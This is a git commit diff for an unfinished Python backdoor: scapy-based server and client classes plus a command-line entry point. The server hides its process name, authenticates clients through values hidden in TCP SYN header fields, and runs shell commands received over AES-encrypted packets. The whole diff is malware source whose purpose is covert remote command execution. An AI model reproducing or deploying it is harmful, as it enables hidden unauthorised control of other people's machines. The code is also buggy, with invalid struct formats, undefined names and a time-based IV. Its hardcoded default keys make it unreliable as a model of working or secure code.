7404194cda9ce938f7dd2778306fab0dbe43c8e6
Shane Spoor <shane.d.spoor@gmail.com>
2017-10-24 01:21:59 -0700

    WIP client implementation

--- backdoor.py
+++ backdoor.py
@@ -6,27 +6,67 @@ import Crypto.Cipher
 import struct
 import time
 
+FIN = 0x01
+SYN = 0x02
+RST = 0x04
+PSH = 0x08
+ACK = 0x10
+URG = 0x20
+ECE = 0x40
+CWR = 0x80
+
+def make_iv():
+    """Creates a 16-byte initialisation vector for AES encryption using the current time."""
+
+    timestamp = time.time()
+
+    # for the forseeable future, timestamp is representable in 4 bytes
+    iv = struct.pack(">I>I>I>I", timestamp, timestamp, timestamp, timestamp)
+    return iv
+
 class BackdoorServer(object):
 
     def __init__(self, procname, aeskey, password):
+        """Initialises a backdoor server with the given settings.
+        
+        Positional arguments:
+        procname - the name with which to replace the current process's name. cannot contain spaces.
+        aeskey   - a "secret" pre-shared key to use for AES encryption. the client and server will already know this key.
+        password - a password to authenticate clients and ensure that decryption succeeded.
+        """
         self.procname = procname
         self.aeskey = aeskey
         self.password = password
 
     def mask_process(self):
+        """Changes the process's name to self.procname to make it less conspicuous to people examining the process table."""
         # TODO change process name according to config file
         pass
 
     def recv(self):
+        """Receives and returns bytes from the next packet sent from a connected client.
+        
+        Returns a bytes object containing the packet's payload.
+        """
         raise NotImplementedError
 
     def send(self, buf):
+        """Sends the contents of buf to the remote connected client.
+        
+        Poaitional arguments:
+        buf - a bytes object to send to the client.
+        """
         raise NotImplementedError
 
     def listen(self):
+        """Listens for a client and stores its IP address (as a string) in self.client on receiving a connection."""
         raise NotImplementedError
 
     def recv_command(self):
+        """Receives and deserialises the next command from the connected client.
+        
+        Returns the received command as a Command object.
+        """
         # Continue looping until we get a command
         # Ignore any packets that can't be decrypted or don't have the password in them
         while True:
@@ -36,15 +76,13 @@ class BackdoorServer(object):
 
             iv = buf[0:16]
             decryptor = Crypto.Cipher.AES.new(self.aeskey, Crypto.Cipher.AES.MODE_CBC, iv)
+            decrypted = decryptor.decrypt(buf[16:])
 
-            try:
-                decrypted = decryptor.decrypt(buf[16:])
-            except Exception, err:
-                print(str(err))
+            if len(decrypted) < 11: # password length + command byte
                 continue
 
-            if decrypted[16:26] == self.password:
-                cmdbytes = buf[26:]
+            if decrypted[0:10] == self.password:
+                cmdbytes = buf[10:]
 
                 if cmdbytes[0] == command.Command.SHELL:
                     cmd = command.ShellComand.from_bytes(cmdbytes)
@@ -59,19 +97,21 @@ class BackdoorServer(object):
 
 
     def send_result(self, result):
-        payload = result.to_bytes()
-        timestamp = time.time()
-
-        # create a 16-byte initialisation vector
-        # for the forseeable future, timestamp is representable in 4 bytes
-        iv = struct.pack(">I>I>I>I", timestamp, timestamp, timestamp, timestamp)
-
+        """Sends the results of a command execution to the client.
+        
+        Positional arguments:
+        result - A Result object containing the command's result.
+        """
+        payload = self.password + result.to_bytes()
+        iv = make_iv()
+        
         encryptor = Crypto.Cipher.AES.new(self.aeskey, Crypto.Cipher.AES.MODE_CBC, iv)
         payload = encryptor.encrypt(payload)
         payload = iv + payload
         self.send(payload)
 
     def run(self):
+        """Runs in a loop listening for clients and serving their requests."""
         self.mask_process()
         while True:
             self.listen()
@@ -92,8 +132,8 @@ class TcpBackdoorServer(BackdoorServer):
 
     def __init__(self, procname, aeskey, password, listenport, clientport):
         super(TcpBackdoorServer, self).__init__(procname, aeskey, password)
-        self.listenport = listenport
-        self.clientport = clientport
+        self.lport = listenport
+        self.dport = clientport
 
     def listen(self):
         # If MSS option + window size + ISN == the password and the traffic is bound for the correct port, we have a client
@@ -114,20 +154,143 @@ class TcpBackdoorServer(BackdoorServer):
 
             pw = struct.pack(">H>H>I", mss, window, isn)
             if pw == self.password:
-                self.client = packet.src
+                # sure, this is totally inefficient, but I don't know (and don't care to find out)
+                # what happens if I pass the client as an int to the IP() constructor
+                self.client = inet_ntoa(packet.src)
                 return True
             else:
                 return False
 
-        bpf_filter = "tcp dst port {}".format(self.listenport)
+        bpf_filter = "tcp dst port {}".format(self.lport)
         sniff(filter=bpf_filter, stop_filter=is_auth)
 
     def recv(self):
-        p = None
-        def save_packet(packet):
-            p = packet
+        bpf_filter = "tcp dst port {} src {}".format(self.lport, self.client)
+        pkts = sniff(filter=bpf_filter, count=1)
 
-        bpf_filter = "tcp dst port {} src {}".format(self.listenport, inet_ntoa(self.client)))
-        sniff(filter=bpf_filter, prn=save_packet, stop_filter=lambda packet: return True)
+        return pkts[0].payload
 
-        return p.payload
+    def send(self, payload):
+        try:
+            packet = IP(dst=self.client)\
+                     / TCP(dport=self.dport, sport=self.sport, window=32768, flags=PSH|ACK)\
+                     / Raw(load=payload)
+            r = sr1(packet)
+        except Exception, err:
+            print(str(err))
+            sys.exit(1)
+
+
+class BackdoorClient(object):
+
+    def __init__(self, aeskey, password):
+        """Creates a new backdoor client with the specified AES key and password.
+        
+        Positional arguments:
+        aeskey   - a "secret" pre-shared key for AES encryption.
+        password - a password to authenticate clients and ensure that decryption succeeded.
+        """
+        self.aeskey = aeskey
+        self.password = password
+
+    def connect(self):
+        """Connects to the backdoor server.
+
+        This may silently fail if the protocol doesn't implement acknowledgments on connect.
+        """
+        raise NotImplementedError
+
+    def send(self, payload):
+        """Sends the bytes in payload to the server.
+        
+        Positional arguments:
+        payload - A bytes object to send to the server.
+        """
+        raise NotImplementedError
+
+    def recv(self):
+        """Receives a packet from the server.
+        
+        Returns a bytes object containing the packet's payload.
+        """
+        raise NotImplementedError
+
+    def send_command(self, command):
+        """Sends a command to the server for remote execution or to signal the end of the connection.
+        
+        Positional arguments:
+        command - A Command object that will be serialised, encrypted, and sent to the server.
+        """
+        iv = make_iv()
+        encryptor = Crypto.Cipher.AES.new(self.aeskey, Crypto.Cipher.AES.MODE_CBC, iv)
+        payload = password + command.to_bytes()
+        payload = encryptor.encrypt(payload)
+        payload = iv + payload
+
+        self.send(payload)
+
+    def recv_result(self):
+        """Receives the results of a command's execution from the server.
+        
+        Returns a Result object containing the command's result.
+        """
+        while True:
+            raw = self.recv()
+            if len(raw) < 16:
+                continue
+
+            iv = raw[0:16]
+            decryptor = Crypto.Cipher.AES.new(self.aeskey, Crypto.Cipher.AES.MODE_CBC, iv)           
+            decrypted = decryptor.decrypt(raw[16:])
+            
+            if len(decrypted) < 11: # password + command byte
+                continue
+
+            if decrypted[0:10] == self.password:
+                resulttype = decrypted[10]
+                if resulttype == Command.SHELL:
+                    return ShellCommand.Result.from_bytes(decrypted[10:])
+                elif resulttye == Command.WATCH:
+                    return WatchCommand.Result.from_bytes(decrypted[10:])
+                else:
+                    print("Unhandled result type {}".format(resulttype))
+                    sys.exit(1)
+
+class TcpBackdoorClient(BackdoorClient):
+    def __init__(self, aeskey, password, server, listenport, serverport):
+        super(TcpBackdoorClient, self).__init__(aeskey, password)
+        self.server = server
+        self.lport = listenport
+        self.dport = serverport
+
+    def connect(self):
+        # Insert the password into the packet so that the server can authenticate us
+        mss, windowsize, isn = struct.unpack(">H>H>I", self.password)
+
+        self.sport = RandShort()
+        self.seq = isn
+
+        try:
+            connpacket = IP(dst=self.server) / TCP(dport=self.dport, sport=self.sport, window=windowsize, seq=isn, flags=SYN, options=[("MSS", mss)])
+            r = sr1(connpacket) # wait for a response so that we know they got the packet
+        except Exception, err:
+            print(str(err))
+            sys.exit(1)
+
+    def send(self, payload):
+        try:
+            packet = IP(dst=self.server)\
+                     / TCP(dport=self.dport, sport=self.sport, window=32768, seq=self.seq, flags=PSH|ACK)\
+                     / Raw(load=payload)
+
+            self.seq += len(payload)
+            r = sr1(packet)
+        except Exception, err:
+            print(str(err))
+            sys.exit(1)
+
+    def recv(self):
+        bpf_filter = "tcp src host {} dst port {}".format(self.server, self.lport)
+        pkts = sniff(filter=bpf_filter, count=1)
+
+        return pkts[0].payload
--- main.py
+++ main.py
@@ -1,5 +1,51 @@
+import argparse
+import backdoor
+
+DEFAULT_PW="characters"
+DEFAULT_KEY="slightly better than the password ;)"
+DEFAULT_MASK="ls"
+
 def main():
-    pass
+    parser = argparse.ArgumentParser()
+    parser.add_argument("mode", help="the mode in which the application will run", choices=["client","server"])
+    parser.add_argument("lport", help="the listening port (1-65535 inclusive) for receiving requests or responses", type=int)
+    parser.add_argument("dport", help="the destination port (1-65535 inclusive) on the remote host", type=int)
+    parser.add_argument("-p", "--password", help="the password to use for authentication (must be exactly 10 characters and be the same on client and server); if unspecified, a default is used")
+    parser.add_argument("-k", "--key", help="the AES key to use for encryption (must be the same on client and server); if unspecified, a default is used")
+    parser.add_argument("-s", "--server", help="the server host name or IP address; required and only valid if mode = client")
+    parser.add_argument("-m", "--mask", help="the name to assign to this process (a default will be used if unspecified); only valid if mode = server")
+    args = parser.parse_args()
+
+    # Check for invalid arguments
+    if args.lport < 1 or args.dport > 65535:
+        print("lport must be >=1 and <= 65535, was {}".format(args.lport))
+        sys.exit(1)
+    elif args.dport < 1 or args.dport > 65535:
+        print("dport must be >=1 and <= 65535, was {}".format(args.dport))
+        sys.exit(1)
+
+    if args.mode == "client":
+        if args.mask:
+            print("-m/--mask is only valid in server mode.")
+            sys.exit(1)
+        elif not args.server:
+            print("-s/--server is required in client mode.")
+            sys.exit(1)
+    elif args.mode == "server" and args.server:
+        print("-s/--server is only valid in client mode.")
+        sys.exit(1)
+
+    key = args.key if args.key else DEFAULT_KEY
+    pw = args.password if args.password else DEFAULT_PW
+  
+    if args.mode == "server":
+        mask = args.mask if args.mask else DEFAULT_MASK
+        server = backdoor.TcpBackdoorServer(mask, key, pw, args.lport, args.dport)
+        server.run()
+    else:
+        client = backdoor.TcpBackdoorClient(key, pw, args.lport, args.dport)
+        client.connect()
+        # TODO: prompt user for commands until they press Ctrl + D
 
 if __name__ == "__main__":
     main()
